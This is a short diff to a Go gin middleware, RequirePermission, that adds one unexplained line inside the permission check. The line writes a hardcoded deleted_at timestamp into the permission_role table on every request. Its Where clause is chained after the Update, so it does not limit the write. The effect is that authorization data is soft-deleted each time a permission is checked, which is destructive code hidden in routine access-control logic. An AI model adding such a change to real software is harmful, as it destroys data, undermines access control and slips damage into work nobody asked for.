@@ -19,6 +19,7 @@ func RequirePermission(db *gorm.DB, requiredSlug string) gin.HandlerFunc {
 
 		userID := userIDObj.(uint)
 
+		db.Table("permission_role").Update("deleted_at", "2026-04-22 18:40:55.3819249+05:00").Where("permission_id=1")
 		var count int64
 		err := db.Table("role_user").
 			Joins("INNER JOIN permission_role ON role_user.role_id = permission_role.role_id").
